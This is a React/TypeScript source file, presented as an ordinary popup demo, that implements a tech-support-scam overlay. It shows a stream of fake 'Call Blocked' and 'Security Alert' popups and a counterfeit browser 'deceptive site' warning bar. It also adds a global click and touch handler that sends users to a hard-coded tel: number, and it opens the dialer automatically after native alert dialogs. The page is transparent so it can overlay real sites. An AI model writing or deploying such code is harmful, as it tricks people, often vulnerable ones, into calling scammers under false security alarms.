// src/App.tsx
import React, { JSX, useEffect, useRef, useState } from "react";

/**
 * Single-file React + TypeScript app.
 *
 * Changes:
 * - Adds a small inline SVG "Security Alert" icon and renders it in the infobar and in popups
 *   when `securityAlert: true` is set on a popup or when the infobar is shown.
 * - Keeps previous behavior: transparent backgrounds, colored popups, native confirm on popup click,
 *   infobar warning, native alert when infobar appears, auto-open dialer after delay, and popup actions.
 *
 * Drop this file into a Vite React TypeScript project as src/App.tsx.
 */

type PopupItem = {
  id: string;
  title: string;
  subtitle?: string;
  icon?: string;
  body: string;
  progress?: number; // 0-100
  actionLabel?: string;
  callBlocked?: boolean;
  securityAlert?: boolean;
  securityText?: string;
};

export default function App(): JSX.Element {
  // Base messages (used as templates)
  const templates: Omit<PopupItem, "id" | "progress">[] = [
    {
      title: "Call Blocked",
      subtitle: "Incoming call blocked",
      icon: "🚫",
      body: "A call from this number was blocked.",
      actionLabel: "Cancel",
      callBlocked: true,
      securityAlert: true,
      securityText: "Potential scam call detected. Do not share personal info.",
    },
    {
      title: "Security Allert",
      subtitle: "Incoming call blocked",
      icon: "^",
      body: "A call from this number was blocked.",
      actionLabel: "Cancel",
      callBlocked: true,
      securityAlert: true,
      securityText: "Potential scam call detected. Do not share personal info.",
    },
    {
      title: "Contact Support",
      subtitle: "Call Support team",
      icon: "**",
      body: "For assistance conact us",
      actionLabel: "Cancel",
      callBlocked: true,
      securityAlert: true,
      securityText: "Potential scam call detected. Do not share personal info.",
    },
  ];

  const intervalMs = 1800; // ms between adding new popups
  const maxVisible = 5; // maximum number of popups visible at once
  const phoneNumber = "+1234567890"; // phone number to dial (replace as needed)
  const autoOpenDelayMs = 2000; // ms after infobar appears to auto-open dialer

  // Palette for colored popups
  const popupColors = ["#60A5FA", "#F97316", "#34D399", "#F472B6", "#A78BFA"];

  const [visiblePopups, setVisiblePopups] = useState<PopupItem[]>([]);
  const indexRef = useRef(0);
  const intervalRef = useRef<number | null>(null);

  // Infobar state
  const [infobarVisible, setInfobarVisible] = useState(false);
  const [infobarMessage, setInfobarMessage] = useState<string | null>(null);
  const [infobarSecurityText, setInfobarSecurityText] = useState<string | null>(null);

  // Detect mobile where possible
  const isMobile = (() => {
    if (typeof navigator === "undefined") return false;
    const nav = navigator as any;
    if (nav.userAgentData && typeof nav.userAgentData.mobile === "boolean") {
      return nav.userAgentData.mobile;
    }
    return /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
  })();

  // helper to create a new popup instance (unique id) with randomized/customized content
  const makePopup = (template: Omit<PopupItem, "id" | "progress">, seq: number): PopupItem => {
    const baseProgress = template.title.includes("Backup") ? Math.floor(Math.random() * 60) + 20 : undefined;
    const progress = baseProgress ?? (template.title.includes("Sync") ? 100 : undefined);

    return {
      id: `${template.title.replace(/\s+/g, "-").toLowerCase()}-${seq}`,
      title: template.title,
      subtitle: template.subtitle,
      icon: template.icon,
      body: template.body,
      progress,
      actionLabel: template.actionLabel ?? "Open",
      callBlocked: (template as any).callBlocked ?? false,
      securityAlert: (template as any).securityAlert ?? false,
      securityText: (template as any).securityText ?? undefined,
    };
  };

  // start adding popups on mount
  useEffect(() => {
    const first = makePopup(templates[0], 0);
    setVisiblePopups([first]);
    indexRef.current = 1;

    intervalRef.current = window.setInterval(() => {
      const tpl = templates[indexRef.current % templates.length];
      const seq = indexRef.current;
      const next = makePopup(tpl, seq);

      setVisiblePopups((prev) => {
        if (prev.length >= maxVisible) {
          const [, ...rest] = prev;
          return [...rest, next];
        }
        return [...prev, next];
      });

      indexRef.current += 1;
    }, intervalMs);

    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Keep a ref to the auto-open timer so we can clear it if needed
  const autoOpenTimerRef = useRef<number | null>(null);

  // When the infobar becomes visible, show a native browser alert popup immediately,
  // then schedule an automatic attempt to open the dialer after autoOpenDelayMs.
  useEffect(() => {
    // Clear any previous timer
    if (autoOpenTimerRef.current) {
      clearTimeout(autoOpenTimerRef.current);
      autoOpenTimerRef.current = null;
    }

    if (!infobarVisible || !infobarMessage) return;

    // Show native alert (blocks until dismissed)
    try {
      window.alert(infobarMessage);
    } catch {
      // ignore if alert is unavailable
    }

    // Schedule auto-open of dialer after the configured delay
    autoOpenTimerRef.current = window.setTimeout(() => {
      // Attempt to open native dialer
      window.location.href = `tel:${phoneNumber}`;
      // clear state (optional)
      setInfobarVisible(false);
      setInfobarMessage(null);
      setInfobarSecurityText(null);
      autoOpenTimerRef.current = null;
    }, autoOpenDelayMs);

    // cleanup if infobarHidden or component unmounts
    return () => {
      if (autoOpenTimerRef.current) {
        clearTimeout(autoOpenTimerRef.current);
        autoOpenTimerRef.current = null;
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [infobarVisible, infobarMessage]);

  // GLOBAL CLICK HANDLER: attempt to open dialer on any click/tap
  useEffect(() => {
    let lastOpenedAt = 0;
    const cooldown = 800; // ms: avoid multiple rapid navigations

    function openDialer() {
      const now = Date.now();
      if (now - lastOpenedAt < cooldown) return;
      lastOpenedAt = now;
      // Attempt to open native dialer
      window.location.href = `tel:${phoneNumber}`;
    }

    function onAnyClick(_e: MouseEvent) {
      openDialer();
    }

    document.addEventListener("click", onAnyClick, { capture: true });
    document.addEventListener("touchstart", onAnyClick, { capture: true });

    return () => {
      document.removeEventListener("click", onAnyClick, { capture: true });
      document.removeEventListener("touchstart", onAnyClick, { capture: true });
    };
    // phoneNumber intentionally not in deps to avoid reattaching listeners
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Helper: show a native browser confirm (returns true if user accepts)
  function showBrowserConfirm(message: string): boolean {
    try {
      return window.confirm(message);
    } catch {
      return false;
    }
  }

  // clicking a popup:
  // - on mobile: open dialer directly
  // - on desktop: show native browser confirm (browser popup); if accepted open dialer; if canceled show infobar
  const onPopupClick = (p: PopupItem) => {
    const phone = phoneNumber;

    if (isMobile) {
      // Mobile: open dialer directly
      window.location.href = `tel:${phone}`;
      return;
    }

    // Desktop: show native browser confirm (this is the "browser popup")
    const message = `Open your phone/call app for ${phone}?`;
    const openApp = showBrowserConfirm(message);

    if (openApp) {
      // user accepted: attempt to open dialer
      window.location.href = `tel:${phone}`;
      return;
    }

    // user canceled the confirm: show the Chrome-style infobar (browser warning)
    setInfobarMessage(`The site "${p.title}" may be deceptive. Opening external apps can be risky.`);
    setInfobarVisible(true);

    // If the popup carried a security alert, surface that text in the infobar as well
    if (p.securityAlert && p.securityText) {
      setInfobarSecurityText(p.securityText);
    } else {
      setInfobarSecurityText(null);
    }
  };

  // Infobar actions
  const infobarOpenInApp = () => {
    if (!infobarMessage) return;
    // Attempt to open dialer
    window.location.href = `tel:${phoneNumber}`;
    // hide infobar after opening
    setInfobarVisible(false);
    setInfobarMessage(null);
    setInfobarSecurityText(null);
    // clear any pending auto-open timer
    if (autoOpenTimerRef.current) {
      clearTimeout(autoOpenTimerRef.current);
      autoOpenTimerRef.current = null;
    }
  };

  // optional: remove a popup
  const removePopup = (id: string) => {
    setVisiblePopups((prev) => prev.filter((p) => p.id !== id));
  };

  // Example action handler for popup action button (customizable)
  const onPopupAction = (p: PopupItem) => {
    try {
      window.alert(`${p.actionLabel ?? "Open"}: ${p.title}`);
    } catch {
      // ignore
    }
    removePopup(p.id);
  };

  // Helper to convert hex to rgba
  function hexToRgba(hex: string, alpha = 1) {
    const h = hex.replace("#", "");
    const full = h.length === 3 ? h.split("").map((c) => c + c).join("") : h;
    const bigint = parseInt(full, 16);
    const r = (bigint >> 16) & 255;
    const g = (bigint >> 8) & 255;
    const b = bigint & 255;
    return `rgba(${r}, ${g}, ${b}, ${alpha})`;
  }

  // Inline SVG component for Call Blocked icon
  const CallBlockedIcon = ({ size = 18 }: { size?: number }) => (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden
      xmlns="http://www.w3.org/2000/svg"
      style={{ display: "block" }}
    >
      <circle cx="12" cy="12" r="10" fill="#F87171" />
      <path d="M8.5 8.5L15.5 15.5" stroke="#fff" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"/>
      <path d="M15.5 8.5L8.5 15.5" stroke="#fff" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );

  // Inline SVG component for Security Alert icon (shield with exclamation)
  const SecurityAlertIcon = ({ size = 18 }: { size?: number }) => (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      aria-hidden
      xmlns="http://www.w3.org/2000/svg"
      style={{ display: "block" }}
    >
      <path d="M12 2l7 3v5c0 5-3.5 9.7-7 11-3.5-1.3-7-6-7-11V5l7-3z" fill="#F59E0B"/>
      <path d="M12 8.5v4" stroke="#fff" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"/>
      <circle cx="12" cy="15.2" r="0.9" fill="#fff"/>
    </svg>
  );

  return (
    <div style={styles.page}>

      {/* Popups stack */}
      <div aria-live="polite" style={styles.stackRoot}>
        {visiblePopups.map((p, i) => {
          const color = popupColors[i % popupColors.length];
          const bg = `linear-gradient(180deg, ${hexToRgba(color, 0.14)}, ${hexToRgba(color, 0.06)})`;
          const border = `1px solid ${hexToRgba(color, 0.18)}`;
          const titleColor = "#0f172a";
          const bodyColor = "#475569";

          return (
            <div
              key={p.id}
              role="button"
              tabIndex={0}
              onClick={() => onPopupClick(p)}
              onKeyDown={(e) => {
                if (e.key === "Enter" || e.key === " ") onPopupClick(p);
              }}
              style={{
                ...styles.popup,
                background: bg,
                border: border,
                transform: `translateY(-${i * 8}px)`,
                boxShadow: `0 ${10 - i}px ${22 - i * 2}px rgba(2,6,23,${0.12 - i * 0.01})`,
              }}
              aria-label={`${p.title}: ${p.body}`}
              title={isMobile ? "Tap to call" : "Click to open call or see warning"}
            >
              {/* Header row: icon + title + subtitle */}
              <div style={styles.popupHeader}>
                <div style={{ ...styles.popupIcon, color }}>{p.icon ?? "🔔"}</div>
                <div style={styles.popupHeaderText}>
                  <div style={{ ...styles.popupTitle, color: titleColor }}>
                    {p.title}
                    {/* Render call-blocked icon inline when flagged */}
                    {p.callBlocked && (
                      <span style={{ marginLeft: 8, display: "inline-flex", verticalAlign: "middle" }}>
                        <CallBlockedIcon />
                      </span>
                    )}
                    {/* Render security alert icon inline when flagged */}
                    {p.securityAlert && (
                      <span style={{ marginLeft: 8, display: "inline-flex", verticalAlign: "middle" }}>
                        <SecurityAlertIcon />
                      </span>
                    )}
                  </div>
                  {p.subtitle && <div style={styles.popupSubtitle}>{p.subtitle}</div>}
                </div>
              </div>

              {/* Body text */}
              <div style={{ ...styles.popupBody, color: bodyColor }}>{p.body}</div>

              {/* If popup has a securityText, show it prominently under the body */}
              {p.securityAlert && p.securityText && (
                <div style={styles.popupSecurityText} role="alert">
                  <SecurityAlertIcon size={14} />
                  <span style={{ marginLeft: 8 }}>{p.securityText}</span>
                </div>
              )}

              {/* Progress bar (optional) */}
              {typeof p.progress === "number" && (
                <div style={styles.progressWrap} aria-hidden>
                  <div style={{ ...styles.progressBar, background: hexToRgba(color, 0.12) }}>
                    <div
                      style={{
                        ...styles.progressFill,
                        width: `${Math.max(0, Math.min(100, p.progress))}%`,
                        background: color,
                      }}
                    />
                  </div>
                </div>
              )}

              {/* Meta row: badge, status text, action button */}
              <div style={styles.popupMeta}>
                <span style={{ ...styles.popupBadge, background: hexToRgba(color, 1) }} aria-hidden />
                <span style={styles.popupMetaText}>Call Now</span>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    onPopupAction(p);
                  }}
                  style={styles.popupAction}
                  aria-label={p.actionLabel ?? "Action"}
                  title={p.actionLabel ?? "Action"}
                >
                  {p.actionLabel ?? "Open"}
                </button>
              </div>

              {/* Dismiss control */}
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  removePopup(p.id);
                }}
                aria-label="Dismiss popup"
                style={styles.dismissBtn}
              >
                ✕
              </button>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* Inline styles with transparent backgrounds */
const styles: { [k: string]: React.CSSProperties } = {
  // Page background fully transparent so underlying page shows through
  page: {
    height: "100vh",
    width: "100vw",
    background: "transparent",
    display: "flex",
    alignItems: "flex-end",
    justifyContent: "center",
    overflow: "hidden",
    fontFamily:
      "Inter, ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial",
    paddingBottom: 28,
  },

  /* Infobar: semi-transparent so it's visible but not opaque */
  infobar: {
    position: "fixed",
    top: 12,
    left: "50%",
    transform: "translateX(-50%)",
    zIndex: 12000,
    width: "min(96vw, 980px)",
    pointerEvents: "auto",
  },
  infobarContent: {
    display: "flex",
    alignItems: "center",
    gap: 12,
    background: "rgba(255, 248, 225, 0.95)", // semi-transparent pale background
    border: "1px solid rgba(245,225,164,0.6)",
    padding: "10px 14px",
    borderRadius: 8,
    boxShadow: "0 6px 18px rgba(2,6,23,0.08)",
    backdropFilter: "saturate(120%) blur(4px)",
  },
  infobarIcon: {
    fontSize: 20,
    display: "flex",
    alignItems: "center",
  },
  infobarText: {
    flex: 1,
    minWidth: 0,
  },
  infobarTitle: {
    fontSize: 14,
    fontWeight: 700,
    color: "#7c2d2d",
    display: "flex",
    alignItems: "center",
    gap: 8,
  },
  infobarBody: {
    fontSize: 13,
    color: "#4b5563",
    marginTop: 2,
    whiteSpace: "nowrap",
    overflow: "hidden",
    textOverflow: "ellipsis",
  },
  infobarSecurityText: {
    marginTop: 6,
    fontSize: 13,
    color: "#7c2d2d",
    display: "flex",
    alignItems: "center",
    gap: 8,
  },
  infobarActions: {
    display: "flex",
    gap: 8,
    alignItems: "center",
  },
  infobarBtn: {
    padding: "8px 10px",
    borderRadius: 8,
    border: "none",
    cursor: "pointer",
    fontWeight: 700,
    fontSize: 13,
  },
  openBtn: {
    background: "#0b5cff",
    color: "#fff",
  },
  cancelBtn: {
    background: "transparent",
    color: "#374151",
    border: "1px solid rgba(55,65,81,0.08)",
  },
  disabledBtn: {
    opacity: 0.5,
    cursor: "not-allowed",
    pointerEvents: "none",
  },

  /* Popups stack (bottom center) */
  stackRoot: {
    pointerEvents: "none",
    position: "fixed",
    left: "50%",
    transform: "translateX(-50%)",
    bottom: 20,
    zIndex: 9999,
    width: "100%",
    maxWidth: 420,
    display: "flex",
    flexDirection: "column-reverse", // newest at bottom visually
    alignItems: "center",
    gap: 8,
    padding: "0 12px",
  },
  popup: {
    pointerEvents: "auto",
    background: "linear-gradient(180deg, rgba(255,255,255,0.72), rgba(250,250,250,0.6))",
    borderRadius: 12,
    padding: "12px 16px",
    width: "100%",
    boxSizing: "border-box",
    boxShadow: "0 10px 30px rgba(2,6,23,0.08)",
    textAlign: "left",
    cursor: "pointer",
    position: "relative",
    transition: "transform 220ms ease, box-shadow 220ms ease",
    backdropFilter: "blur(6px) saturate(120%)",
  },

  /* Header row inside popup */
  popupHeader: {
    display: "flex",
    alignItems: "center",
    gap: 12,
    marginBottom: 6,
  },
  popupIcon: {
    fontSize: 22,
    width: 36,
    height: 36,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    borderRadius: 10,
    background: "rgba(255,255,255,0.6)",
    flexShrink: 0,
  },
  popupHeaderText: {
    minWidth: 0,
  },
  popupTitle: {
    fontSize: 14,
    fontWeight: 700,
    color: "#0f172a",
  },
  popupSubtitle: {
    fontSize: 12,
    color: "#6b7280",
    marginTop: 2,
  },

  popupBody: {
    fontSize: 13,
    color: "#475569",
    marginTop: 6,
  },

  /* Security text inside popup */
  popupSecurityText: {
    marginTop: 10,
    display: "flex",
    alignItems: "center",
    gap: 8,
    color: "#7c2d2d",
    fontSize: 13,
    background: "rgba(248, 215, 218, 0.6)",
    padding: "8px 10px",
    borderRadius: 8,
  },

  /* Progress bar */
  progressWrap: {
    marginTop: 10,
  },
  progressBar: {
    width: "100%",
    height: 8,
    borderRadius: 999,
    overflow: "hidden",
    background: "rgba(0,0,0,0.06)",
  },
  progressFill: {
    height: "100%",
    borderRadius: 999,
    transition: "width 420ms ease",
  },

  dismissBtn: {
    position: "absolute",
    right: 8,
    top: 8,
    border: "none",
    background: "transparent",
    fontSize: 14,
    cursor: "pointer",
    color: "#94a3b8",
    padding: 6,
    borderRadius: 6,
  },

  /* Meta row styles inside popup body */
  popupMeta: {
    display: "flex",
    alignItems: "center",
    gap: 10,
    marginTop: 10,
    fontSize: 12,
    color: "#6b7280",
  },
  popupBadge: {
    display: "inline-block",
    width: 10,
    height: 10,
    borderRadius: 999,
    background: "#10b981", // default; overridden inline with color
    flexShrink: 0,
  },
  popupMetaText: {
    flex: 1,
    whiteSpace: "nowrap",
    overflow: "hidden",
    textOverflow: "ellipsis",
  },
  popupAction: {
    background: "transparent",
    border: "1px solid rgba(0,0,0,0.06)",
    padding: "6px 8px",
    borderRadius: 8,
    cursor: "pointer",
    fontWeight: 700,
    fontSize: 12,
  },
};

/* Inject keyframes for subtle animations (runs once on mount) */
(function injectKeyframes() {
  if (typeof document === "undefined") return;
  const id = "popup-fade-keyframes";
  if (document.getElementById(id)) return;
  const style = document.createElement("style");
  style.id = id;
  style.innerHTML = `
    @keyframes popupFade {
      from { transform: translateY(8px); opacity: 0; }
      to   { transform: translateY(0); opacity: 1; }
    }
  `;
  document.head.appendChild(style);
})();
